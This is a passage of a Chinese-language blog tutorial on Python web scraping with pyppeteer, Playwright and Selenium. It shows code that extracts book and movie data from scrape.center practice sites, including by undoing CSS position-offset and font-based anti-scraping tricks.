class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"><span class="keyword">from</span> pyppeteer.errors <span class="keyword">import</span> TimeoutError</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> makedirs</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> exists</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO,</span><br><span class="line">                    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s: %(message)s&#x27;</span>)</span><br><span class="line">INDEX_URL = <span class="string">&#x27;https://spa2.scrape.center/page/&#123;page&#125;&#x27;</span></span><br><span class="line">TIMEOUT = <span class="number">10</span></span><br><span class="line">TOTAL_PAGE = <span class="number">1</span></span><br><span class="line">WINDOW_WIDTH, WINDOW_HEIGHT = <span class="number">1366</span>, <span class="number">768</span></span><br><span class="line">HEADLESS = <span class="literal">False</span></span><br><span class="line">RESULTS_DIR = <span class="string">&#x27;results&#x27;</span></span><br><span class="line"></span><br><span class="line">exists(RESULTS_DIR) <span class="keyword">or</span> makedirs(RESULTS_DIR)</span><br><span class="line">browser, tab = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    初始化浏览器，新建选项卡</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> browser, tab</span><br><span class="line">    browser = <span class="keyword">await</span> launch(headless=HEADLESS, args=[<span class="string">&#x27;--disable-infobars&#x27;</span>,  <span class="comment"># 隐藏提示条，设置浏览器宽高</span></span><br><span class="line">                                                    <span class="string">f&#x27;--window-size=<span class="subst">&#123;WINDOW_WIDTH&#125;</span>, <span class="subst">&#123;WINDOW_HEIGHT&#125;</span>&#x27;</span>])</span><br><span class="line">    tab = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">    <span class="keyword">await</span> tab.setViewport(&#123;<span class="string">&#x27;width&#x27;</span>: WINDOW_WIDTH, <span class="string">&#x27;height&#x27;</span>: WINDOW_HEIGHT&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">scrape_page</span>(<span class="params">url, selector</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通用爬取方法</span></span><br><span class="line"><span class="string">    :param url:</span></span><br><span class="line"><span class="string">    :param selector:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    logging.info(<span class="string">&#x27;scraping %s&#x27;</span>, url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">await</span> tab.goto(url)</span><br><span class="line">        <span class="keyword">await</span> tab.waitForSelector(selector, options=&#123;</span><br><span class="line">            <span class="string">&#x27;timeout&#x27;</span>: TIMEOUT * <span class="number">1000</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span> TimeoutError:</span><br><span class="line">        logging.error(<span class="string">&#x27;error occurred while scraping %s&#x27;</span>, url, exc_info=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">scrape_index</span>(<span class="params">page</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    列表页爬取</span></span><br><span class="line"><span class="string">    :param page: 页码</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    url = INDEX_URL.<span class="built_in">format</span>(page=page)</span><br><span class="line">    <span class="keyword">await</span> scrape_page(url, <span class="string">&#x27;.item .name&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">parse_index</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    详情页 URL 解析</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 选择节点并执行对应 JavaScript 代码</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> tab.querySelectorAllEval(<span class="string">&#x27;.item .name&#x27;</span>, <span class="string">&#x27;nodes =&gt; nodes.map(node =&gt; node.href)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">scrape_detail</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    详情页爬取</span></span><br><span class="line"><span class="string">    :param url:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">await</span> scrape_page(url, <span class="string">&#x27;h2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">parse_detail</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    详情页解析</span></span><br><span class="line"><span class="string">    :return: dict</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    url = tab.url</span><br><span class="line">    name = <span class="keyword">await</span> tab.querySelectorEval(<span class="string">&#x27;h2&#x27;</span>, <span class="string">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class="line">    categories = <span class="keyword">await</span> tab.querySelectorAllEval(<span class="string">&#x27;.categories button span&#x27;</span>, <span class="string">&#x27;nodes =&gt; nodes.map(node =&gt; node.innerText)&#x27;</span>)</span><br><span class="line">    cover = <span class="keyword">await</span> tab.querySelectorEval(<span class="string">&#x27;.cover&#x27;</span>, <span class="string">&#x27;node =&gt; node.src&#x27;</span>)</span><br><span class="line">    score = <span class="keyword">await</span> tab.querySelectorEval(<span class="string">&#x27;.score&#x27;</span>, <span class="string">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class="line">    drama = <span class="keyword">await</span> tab.querySelectorEval(<span class="string">&#x27;.drama p&#x27;</span>, <span class="string">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span>: url,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;categories&#x27;</span>: categories,</span><br><span class="line">        <span class="string">&#x27;cover&#x27;</span>: cover,</span><br><span class="line">        <span class="string">&#x27;score&#x27;</span>: score,</span><br><span class="line">        <span class="string">&#x27;drama&#x27;</span>: drama</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    保存数据</span></span><br><span class="line"><span class="string">    :param data: dict</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    name = data.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    data_path = <span class="string">f&#x27;<span class="subst">&#123;RESULTS_DIR&#125;</span>/<span class="subst">&#123;name&#125;</span>.json&#x27;</span></span><br><span class="line">    json.dump(data, <span class="built_in">open</span>(data_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>), ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">await</span> init()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, TOTAL_PAGE + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">await</span> scrape_index(page)</span><br><span class="line">            detail_urls = <span class="keyword">await</span> parse_index()</span><br><span class="line">            <span class="comment"># logging.info(&#x27;detail_urls |%s&#x27;, list(detail_urls))</span></span><br><span class="line">            <span class="keyword">for</span> detail_url <span class="keyword">in</span> <span class="built_in">list</span>(detail_urls):</span><br><span class="line">                logging.info(<span class="string">&#x27;get detail url %s&#x27;</span>, detail_url)</span><br><span class="line">                <span class="keyword">await</span> scrape_detail(detail_url)</span><br><span class="line">                detail_data = <span class="keyword">await</span> parse_detail()</span><br><span class="line">                logging.info(<span class="string">&#x27;detail data %s&#x27;</span>, detail_data)</span><br><span class="line">                <span class="keyword">await</span> save_data(detail_data)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure><h3 id="Playwright-的使用"><a href="#Playwright-的使用" class="headerlink" title="Playwright 的使用"></a>Playwright 的使用</h3><p>Playwright 是微软在2020年初开源的新一代自动化测试工具，功能与 Selenium 和 Pyppeteer 类似，支持当前所有主流浏览器，支持<strong>移动端页面测试</strong>，使用设备模拟技术，可以让我们在移动 Web 浏览器中测试响应式的 Web 应用程序。</p><p>支持两种编写模式，一种是和 Pyppeteer 一样的异步模式，一种是和 Selenium 一样的同步模式，示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同步模式</span></span><br><span class="line"><span class="keyword">from</span> playwright.sync_api <span class="keyword">import</span> sync_playwright</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">    <span class="keyword">for</span> browser_type <span class="keyword">in</span> [p.chromium, p.firefox, p.webkit]:</span><br><span class="line">        browser = browser_type.launch(headless=<span class="literal">False</span>)</span><br><span class="line">        page = browser.new_page()</span><br><span class="line">        page.goto(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)</span><br><span class="line">        page.screenshot(path=<span class="string">f&#x27;screenshot-<span class="subst">&#123;browser_type.name&#125;</span>.png&#x27;</span>)</span><br><span class="line">        print(page.title)</span><br><span class="line">        browser.close()</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 异步模式</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> playwright.async_api <span class="keyword">import</span> async_playwright</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> async_playwright() <span class="keyword">as</span> p:</span><br><span class="line">        <span class="keyword">for</span> browser_type <span class="keyword">in</span> [p.chromium, p.firefox, p.webkit]:</span><br><span class="line">            browser = <span class="keyword">await</span> browser_type.launch()</span><br><span class="line">            page = <span class="keyword">await</span> browser.new_page()</span><br><span class="line">            page.goto(<span class="string">&#x27;https://www.baidu.com/&#x27;</span>)</span><br><span class="line">            page.screenshot(path=<span class="string">f&#x27;screenshot-<span class="subst">&#123;browser_type.name&#125;</span>.png&#x27;</span>)</span><br><span class="line">            print(<span class="keyword">await</span> page.title())</span><br><span class="line">            <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure><p>Playwright 还有一个强大的功能，是可以<strong>录制我们在浏览器中的操作并自动生成代码</strong>，可以通过调用 codegen 实现，查看参数可使用<code>playwright codegen --help</code></p><p>更多详情参考<a href="https://playwright.dev/">官网</a></p><h3 id="CSS-位置偏移反爬案例分析与爬取实战"><a href="#CSS-位置偏移反爬案例分析与爬取实战" class="headerlink" title="CSS 位置偏移反爬案例分析与爬取实战"></a>CSS 位置偏移反爬案例分析与爬取实战</h3><p>本节了解 CSS 反爬虫的一些解决方案</p><p><img data-src="https://s2.loli.net/2022/03/01/F6GtieuvQAd5YOJ.png"></p><p><a href="https://antispider3.scrape.center/">案例网站</a>，先用 Selenium 尝试爬取源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">&#x27;https://antispider3.scrape.center/&#x27;</span>)</span><br><span class="line">WebDriverWait(browser, <span class="number">10</span>).until(EC.visibility_of_all_elements_located((By.CSS_SELECTOR, <span class="string">&#x27;.item&#x27;</span>)))</span><br><span class="line">html = browser.page_source</span><br><span class="line">doc = pq(html)</span><br><span class="line">names = doc(<span class="string">&#x27;.item .name&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> names.items():</span><br><span class="line">    print(name.text())</span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">Wonder</span><br><span class="line">风 家 白 清</span><br><span class="line">法 老 的 宠 妃 终 结 篇 （ 上 下 册 ）</span><br><span class="line">士 为 知 己 （ 全 二 册 ）</span><br><span class="line">那 些 年 ， 我 们 一 起 追 的 女 孩</span><br><span class="line">三 非 册 我 倾 （ 城 全 ）</span><br><span class="line">儿 那 朝 明 事 些</span><br><span class="line">我 书 忘 笑 的 和 你</span><br><span class="line">波 集 卷 一 第 小 全 王</span><br><span class="line">心 动 然 怦</span><br><span class="line">龙枪编年史（全<span class="number">3</span>册）</span><br><span class="line">龙 枪 传 奇 （ 全 三 册 ）</span><br><span class="line">之 明 街 黎</span><br><span class="line">认 理 及 心 学 启 示 其 知</span><br><span class="line">银河帝国<span class="number">2</span>：基地与帝国</span><br><span class="line">银 河 帝 国 ： 基 地</span><br><span class="line">学 教 年 小 - 全 材 解 下 四 级 语 文</span><br><span class="line">越界言论（第<span class="number">3</span>卷）</span><br></pre></td></tr></table></figure><p>可以看到标题的文字顺序很多是乱的，检测网页源代码：</p><p><img data-src="https://s2.loli.net/2022/03/01/xeHsFJqp3Mblwor.png"></p><p>发现网页用 CSS 控制了文字的偏移位置，解决思路就是获取每个 <code>span</code> 节点的 <code>style</code>属性，提取偏移值，在排序即可得出结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> groups <span class="keyword">as</span> groups</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_name</span>(<span class="params">name_html</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解析标题</span></span><br><span class="line"><span class="string">    :param name_html: 标题节点源代码</span></span><br><span class="line"><span class="string">    :return: title(str)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 过滤正常的标题</span></span><br><span class="line">    has_whole = name_html(<span class="string">&#x27;.whole&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> has_whole:</span><br><span class="line">        <span class="keyword">return</span> name_html.text()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        chars = name_html(<span class="string">&#x27;.char&#x27;</span>)</span><br><span class="line">        items = []</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars.items():</span><br><span class="line">            items.append(&#123;</span><br><span class="line">                <span class="string">&#x27;text&#x27;</span>: char.text().strip(),</span><br><span class="line">                <span class="string">&#x27;left&#x27;</span>: <span class="built_in">int</span>(re.search(<span class="string">&#x27;(\d+)px&#x27;</span>, char.attr(<span class="string">&#x27;style&#x27;</span>)).group(<span class="number">1</span>))</span><br><span class="line">            &#125;)</span><br><span class="line">        items = <span class="built_in">sorted</span>(items, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;left&#x27;</span>], reverse=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([item[<span class="string">&#x27;text&#x27;</span>] <span class="keyword">for</span> item <span class="keyword">in</span> items])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">&#x27;https://antispider3.scrape.center/&#x27;</span>)</span><br><span class="line">WebDriverWait(browser, <span class="number">10</span>).until(EC.visibility_of_all_elements_located((By.CSS_SELECTOR, <span class="string">&#x27;.item&#x27;</span>)))</span><br><span class="line">html = browser.page_source</span><br><span class="line">doc = pq(html)</span><br><span class="line">names = doc(<span class="string">&#x27;.item .name&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name_html <span class="keyword">in</span> names.items():</span><br><span class="line">    name = parse_name(name_html)</span><br><span class="line">    print(name)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><h3 id="字体反爬案例分析与爬取实战"><a href="#字体反爬案例分析与爬取实战" class="headerlink" title="字体反爬案例分析与爬取实战"></a>字体反爬案例分析与爬取实战</h3><p>本节的反爬虫案例，将真实数据隐藏在字体文件中，所以即可得到了网页源码也无法获取想要的数据。</p><p><img data-src="https://s2.loli.net/2022/03/01/pAh9bFIc7sYV81B.png"></p><p><a href="https://antispider4.scrape.center/">案例网站</a>，先用 Selenium 尝试爬取源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">&#x27;https://antispider4.scrape.center/&#x27;</span>)</span><br><span class="line">WebDriverWait(browser, <span class="number">10</span>).until(EC.visibility_of_all_elements_located((By.CSS_SELECTOR, <span class="string">&#x27;.item&#x27;</span>)))</span><br><span class="line">html = browser.page_source</span><br><span class="line">doc = pq(html)</span><br><span class="line">items = doc(<span class="string">&#x27;.item&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> items.items():</span><br><span class="line">    name = item(<span class="string">&#x27;.name&#x27;</span>).text()</span><br><span class="line">    categories = [x.text() <span class="keyword">for</span> x <span class="keyword">in</span> item(<span class="string">&#x27;.categories button span&#x27;</span>).items()]</span><br><span class="line">    score = item(<span class="string">&#x27;.score&#x27;</span>).text()</span><br><span class="line">    print(<span class="string">f&#x27;name: <span class="subst">&#123;name&#125;</span> categories: <span class="subst">&#123;categories&#125;</span> score: <span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">name: 霸王别姬 - Farewell My Concubine categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>] score: </span><br><span class="line">name: 这个杀手不太冷 - Léon categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;动作&#x27;</span>, <span class="string">&#x27;犯罪&#x27;</span>] score: </span><br><span class="line">name: 肖申克的救赎 - The Shawshank Redemption categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;犯罪&#x27;</span>] score: </span><br><span class="line">name: 泰坦尼克号 - Titanic categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>, <span class="string">&#x27;灾难&#x27;</span>] score: </span><br><span class="line">name: 罗马假日 - Roman Holiday categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;喜剧&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>] score: </span><br><span class="line">name: 唐伯虎点秋香 - Flirting Scholar categories: [<span class="string">&#x27;喜剧&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>, <span class="string">&#x27;古装&#x27;</span>] score: </span><br><span class="line">name: 乱世佳人 - Gone <span class="keyword">with</span> the Wind categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>, <span class="string">&#x27;历史&#x27;</span>, <span class="string">&#x27;战争&#x27;</span>] score: </span><br><span class="line">name: 喜剧之王 - The King of Comedy categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;喜剧&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>] score: </span><br><span class="line">name: 楚门的世界 - The Truman Show categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;科幻&#x27;</span>] score: </span><br><span class="line">name: 狮子王 - The Lion King categories: [<span class="string">&#x27;动画&#x27;</span>, <span class="string">&#x27;歌舞&#x27;</span>, <span class="string">&#x27;冒险&#x27;</span>] score: </span><br></pre></td></tr></table></figure><p>发现没有 score，检测网页源码，score 值并不在页面源码中，而是使用 ::before 字段插入伪节点的方法来显示内容的。</p><p><img data-src="https://s2.loli.net/2022/03/01/JyuxIQwUtGKdMel.png"></p><p>通过追踪 CSS 源代码，可以找到 class 取值和 content 字段值的映射，而这个 CSS 文件的位置是 <code>https://antispider4.scrape.center/css/app.654ba59e.css</code>。</p><p><img data-src="https://s2.loli.net/2022/03/01/6YPXBhzTH71Fpwo.png"></p><p>我们可以尝试用 requests 库读取，并通过正则表达式提取映射关系，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 